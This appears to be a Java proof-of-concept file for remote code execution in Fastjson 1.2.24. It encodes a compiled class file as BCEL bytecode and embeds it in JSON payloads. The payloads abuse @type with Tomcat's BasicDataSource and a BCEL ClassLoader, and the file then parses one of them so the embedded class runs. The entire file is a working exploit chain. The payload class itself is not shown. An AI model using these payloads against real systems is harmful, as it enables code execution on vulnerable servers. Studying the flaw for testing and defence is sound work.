package BCEL;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Test {
    public static void main(String[] args) throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get("F:\\Fastjson1.2.24\\src\\main\\java\\BCEL\\Exp.class"));
//        File file = new File("F:\\\\Fastjson1.2.24\\\\src\\\\main\\\\java\\\\BCEL\\\\Exp.class");
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        FileInputStream fileInputStream = new FileInputStream(file);
//        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
//        byte[] bytes = new byte[1024];
//        int len=0;
//        while((len=bufferedInputStream.read(bytes,0,1024))!=-1){
//                byteArrayOutputStream.write(bytes,0,len);
//        }

        //System.out.println(Arrays.toString(cls.getBytes()));

        String code = Utility.encode(bytes, true);//转换为字节码并编码为bcel字节码
        System.out.println(code);
        String poc = "{\n" +
                "    {\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+code+"\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}";

     String   poc2 ="{\n" +
                "        \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "        \"driverClassLoader\": {\n" +
                "            \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"driverClassName\": \"$$BCEL$$"+code+"\"\n" +
                "}";
//        JSON.parse(poc);
        JSON.parseObject(poc2);
    }
}
